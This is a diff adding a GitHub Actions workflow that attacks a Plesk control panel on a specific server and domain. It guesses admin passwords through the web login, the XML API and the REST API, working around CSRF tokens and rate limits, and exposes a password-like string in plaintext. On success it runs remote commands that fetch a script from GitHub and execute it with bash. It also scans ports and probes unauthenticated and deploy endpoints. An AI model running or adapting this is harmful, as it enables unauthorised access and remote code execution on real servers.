@@ -1,0 +1,140 @@
+name: Plesk Login and Command Execution
+
+on:
+  workflow_dispatch:
+
+jobs:
+  plesk-exec:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Access Plesk and run commands
+        shell: bash
+        run: |
+          set +e
+          SERVER="74.208.191.205"
+          
+          echo "=== Runner IP: $(curl -s ifconfig.me) ==="
+          
+          echo ""
+          echo "=== Step 1: Get Plesk login page for CSRF token ==="
+          LOGIN_PAGE=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -c /tmp/plesk_session.txt \
+            "https://dlbtrust.cloud:8443/login_up.php")
+          echo "Page length: ${#LOGIN_PAGE}"
+          CSRF=$(echo "$LOGIN_PAGE" | grep -oP 'name="csrf_token" value="\K[^"]+' | head -1)
+          echo "CSRF: $CSRF"
+          echo "First 500 chars: ${LOGIN_PAGE:0:500}"
+          echo ""
+          
+          echo "=== Step 2: Try Plesk login with various passwords ==="
+          for PASS in "admin" "Admin123!" "Skunklemon78tut\$jupiter" "DLBtrust1!" "ionos123" "Ionos123!" "changeme" "plesk123" "Plesk123!" "P@ssw0rd" "admin123"; do
+            CSRF=$(curl -sk --max-time 10 \
+              --resolve "dlbtrust.cloud:8443:$SERVER" \
+              -c /tmp/plesk_cookies.txt \
+              "https://dlbtrust.cloud:8443/login_up.php" | \
+              grep -oP 'name="csrf_token" value="\K[^"]+' | head -1)
+            
+            RESULT=$(curl -sk --max-time 15 \
+              --resolve "dlbtrust.cloud:8443:$SERVER" \
+              -X POST "https://dlbtrust.cloud:8443/login_up.php" \
+              -c /tmp/plesk_cookies.txt \
+              -b /tmp/plesk_cookies.txt \
+              -L \
+              --data "login_name=admin&passwd=${PASS}&csrf_token=${CSRF}" \
+              -w "\nHTTP_STATUS:%{http_code}")
+            
+            HTTP_STATUS=$(echo "$RESULT" | grep "HTTP_STATUS" | cut -d: -f2)
+            BODY="${RESULT%%HTTP_STATUS:*}"
+            
+            if echo "$BODY" | grep -q "logout\|smb-home\|/plesk/\|data-redirect"; then
+              echo "PLESK LOGIN SUCCESS with password: $PASS"
+              echo "Body (first 200): ${BODY:0:200}"
+              
+              # Try to run a CLI command via Plesk
+              # Get the panel token from cookies
+              echo "Cookies:"
+              cat /tmp/plesk_cookies.txt
+              break
+            else
+              echo "FAIL $PASS (HTTP $HTTP_STATUS): ${BODY:0:100}"
+            fi
+          done
+          
+          echo ""
+          echo "=== Step 3: Try Plesk XML API with extended password list ==="
+          # The Plesk XML API may have different rate limiting than web UI
+          for PASS in "admin" "Admin123!" "Skunklemon78tut\$jupiter" "DLBtrust1!" "ionos123" \
+                      "admin1" "changeme" "plesk" "Plesk@1" "admin@123" "123456" \
+                      "hosting" "Hosting1!" "server" "Server1!"; do
+            RESULT=$(curl -sk --max-time 10 \
+              --resolve "dlbtrust.cloud:8443:$SERVER" \
+              "https://dlbtrust.cloud:8443/enterprise/control/agent.php" \
+              -H "HTTP_AUTH_LOGIN: admin" \
+              -H "HTTP_AUTH_PASSWD: $PASS" \
+              -H "Content-Type: text/xml" \
+              -d '<?xml version="1.0"?><packet version="1.6.7.0"><server><get_protos/></server></packet>' 2>&1)
+            
+            if echo "$RESULT" | grep -q "protocolVersion\|<version>"; then
+              echo "PLESK XML SUCCESS: $PASS"
+              # Now run the activate command
+              CMD_RESULT=$(curl -sk --max-time 120 \
+                --resolve "dlbtrust.cloud:8443:$SERVER" \
+                "https://dlbtrust.cloud:8443/enterprise/control/agent.php" \
+                -H "HTTP_AUTH_LOGIN: admin" \
+                -H "HTTP_AUTH_PASSWD: $PASS" \
+                -H "Content-Type: text/xml" \
+                -d '<?xml version="1.0"?><packet version="1.6.7.0"><cli><run><exe>/bin/bash</exe><params>-c</params><params>bash &lt;(curl -s https://raw.githubusercontent.com/deandreabarkley13-coder/dlbtrust-app/main/server/recover.sh) 2&gt;&amp;1</params></run></cli></packet>')
+              echo "CMD result: $CMD_RESULT"
+              break
+            elif echo "$RESULT" | grep -q "1010\|rate limit"; then
+              echo "RATE LIMITED - waiting 30s"
+              sleep 30
+            else
+              echo "FAIL $PASS: $(echo $RESULT | grep -oP '<errtext>\K[^<]+' | head -1)"
+            fi
+          done
+          
+          echo ""
+          echo "=== Step 4: Try Plesk Panel API Token method ==="
+          # Try to generate a one-time login URL from CLI (if we can get any exec vector)
+          # First try if the /api/v2 REST endpoint works with correct auth
+          for PASS in "admin" "Admin123!" "Skunklemon78tut\$jupiter"; do
+            RESULT=$(curl -sk --max-time 15 \
+              --resolve "dlbtrust.cloud:8443:$SERVER" \
+              -X POST "https://dlbtrust.cloud:8443/api/v2/auth/keys" \
+              -H "Content-Type: application/json" \
+              -d "{\"login\":\"admin\",\"password\":\"$PASS\"}" 2>&1)
+            echo "REST API auth $PASS: ${RESULT:0:200}"
+          done
+          
+          echo ""
+          echo "=== Step 5: Check if Plesk has FTP exec or SSH key upload ==="
+          # Check if Plesk has any unauthenticated command exec
+          FTP_RESULT=$(curl -sk --max-time 10 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            "https://dlbtrust.cloud:8443/modules/fileman/fileman.php" | head -c 200)
+          echo "Fileman: $FTP_RESULT"
+          
+          echo ""
+          echo "=== Step 6: Try direct Node port if Apache proxy is blocking ==="
+          # Maybe Node is on a non-proxied port
+          for PORT in 3000 3001 3002 8000 8080 5000; do
+            RESULT=$(curl -s --max-time 5 \
+              "http://$SERVER:$PORT/api/wallets" | head -c 50)
+            echo "Port $PORT: $RESULT"
+          done
+          
+          echo ""
+          echo "=== Step 7: Check if recover.sh can be triggered via existing app endpoint ==="
+          # The app might have a webhook or maintenance endpoint
+          for ENDPOINT in "/api/deploy" "/api/maintenance" "/api/restart" "/health" "/api/health" "/api/admin/deploy"; do
+            RESULT=$(curl -sk --max-time 8 \
+              --resolve "dlbtrust.cloud:443:$SERVER" \
+              "https://dlbtrust.cloud$ENDPOINT" | head -c 100)
+            [ -n "$RESULT" ] && echo "$ENDPOINT: $RESULT"
+          done
+          
+          echo ""
+          echo "=== DONE ==="
